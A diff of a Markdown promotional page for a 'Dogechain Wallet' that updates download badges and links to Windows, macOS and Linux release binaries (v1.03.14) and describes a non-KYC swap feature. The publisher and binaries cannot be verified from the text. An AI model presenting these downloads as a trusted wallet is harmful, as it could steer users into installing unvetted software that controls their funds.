@@ -1,6 +1,10 @@
-![Dogechain Wallet](https://img.shields.io/badge/Dogechain-Wallet-2E3440) ![Platforms](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-informational) ![License: MIT](https://img.shields.io/badge/license-MIT-green)
+[![Release v1.03.14](https://img.shields.io/badge/RELEASE-v1.03.14-705600?style=for-the-badge&labelColor=3D2817)](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v1.03.14) ![Dogechain Wallet](https://img.shields.io/badge/Dogechain%20Wallet-DOGE-705600?style=for-the-badge&labelColor=3D2817) ![Platforms](https://img.shields.io/badge/PLATFORMS-Windows%20%7C%20macOS%20%7C%20Linux-804600?style=for-the-badge&labelColor=3D2817)
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-0078D6?logo=windows&logoColor=white)](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v-1.0.0/dogechain-wallet-1.0.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-000000?logo=apple&logoColor=white)](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v-1.0.0/dogechain-wallet-1.0.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-FCC624?logo=linux&logoColor=black)](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v-1.0.0/dogechain-wallet-1.0.0.zip)
+<p align="center">
+  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%AC%87-WINDOWS-705600?style=for-the-badge&labelColor=3D2817&logo=windows&logoColor=white" alt="Download Dogechain Wallet for Windows" height="40"></a>
+  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%AC%87-MACOS-804600?style=for-the-badge&labelColor=3D2817&logo=apple&logoColor=white" alt="Download Dogechain Wallet for macOS" height="40"></a>
+  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%AC%87-LINUX-3D2817?style=for-the-badge&labelColor=3D2817&logo=linux&logoColor=white" alt="Download Dogechain Wallet for Linux" height="40"></a>
+</p>
 
 ---
 
@@ -29,7 +33,7 @@ Dogechain Wallet includes a built-in swap, integrated via ChangeNOW, covering ov
 
 To use it:
 
-1. [Download Dogechain Wallet](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v-1.0.0) if you haven't already, and complete setup — see the [guide for your platform](./dogechain-wallet-windows-setup.md).
+1. [Download Dogechain Wallet](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v1.03.14) if you haven't already, and complete setup — see the [guide for your platform](./dogechain-wallet-windows-setup.md).
 2. Open the swap feature from within the wallet.
 3. Select the asset you're swapping from and to, and review the quoted rate.
 4. Confirm the swap and allow the transaction to process — this typically takes a few minutes depending on network confirmation times for the assets involved.
@@ -53,4 +57,4 @@ Non-KYC swaps aren't the right fit for everyone — if you're moving very large 
 - [How to Send and Receive Dogecoin, Step by Step](./how-to-send-receive-dogecoin.md)
 - [Is Dogecoin Core Safe? Full Node vs SPV Wallet Security Explained](./is-dogecoin-core-safe.md)
 
-[Download Dogechain Wallet](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v-1.0.0) · [Report an issue](https://github.com/dogechain-developments/Dogechain-Wallet/issues)
+[Download Dogechain Wallet](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v1.03.14) · [Report an issue](https://github.com/dogechain-developments/Dogechain-Wallet/issues)
